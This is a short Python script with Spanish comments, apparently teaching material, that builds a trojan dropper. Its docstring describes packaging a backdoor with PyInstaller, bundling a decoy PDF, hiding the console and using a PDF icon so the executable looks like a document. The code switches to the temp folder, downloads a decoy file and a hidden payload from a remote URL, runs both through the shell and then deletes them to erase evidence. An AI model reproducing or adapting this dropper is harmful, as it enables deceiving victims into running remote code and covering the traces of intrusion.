#!/usr/bin/env python3

"""
    Como descargarse un fichero, ejecutarlo y eliminar pruebas
    Se ha de crear el fichero como ejecutable con un fichero (--add-data)

    wine msiexec /i python-2.7.17.amd64.msi
    # pyinstaller ha de ser ejecutado desde el "mismo" SO objetivo
        si se ejecuta desde la versión de linux, el ejecutable que creará,
        será para linux, por eso es necesario instalar la versión de WDS con
        wine, para que sea generado un .exe, pe
    $ ~/pyinstaller.XX back_door.py # el código que queremos incrustar
        --add-data "./trojanFile.pdf;." # el fichero con el que lo queremos
                                        camuflar
        --onefile # que solo cree un fichero
        --noconsole # para que no muestre el promt
        --icon ../pdf.ico # el tumbnail que queramos mostrar
"""

import requests
import subprocess
import os
import tempfile


def exe_and_send(command):
    """
        Ejecutamos un commando e informamos por correo
    """
    subprocess.Popen(command, shell=True)


def download(url):
    """
        Descarga un fichero en ua ruta y devuelve el nombre del fichero
    """
    get_response = requests.get(url)
    file_name = url.split("/")[-1]  # Extraemos el nombre del fichero
    with open(file_name, "wb") as out_file:  # wb -> escribir en binario
        out_file.write(get_response.content)
    return file_name


temp_folder = tempfile.gettempdir()
os.chdir(temp_folder)

# Nos vamos a bajar dos ficheros, el primero entretiene al susuario
# mintras que el sugundo se ejecuta en sengundo plano
# Esto hace las funciones de --add-data
trojan = "NotSuspectFile.txt"
url = "Dirección/desde/donde/decargar/el/fichero" + trojan
t_file = download(url)
exe_and_send(trojan)

trojan = "SuspectFile.txt"
url = "Dirección/desde/donde/decargar/el/fichero" + trojan
s_file = download(url)
exe_and_send(trojan)
os.remove(s_file)
os.remove(t_file)
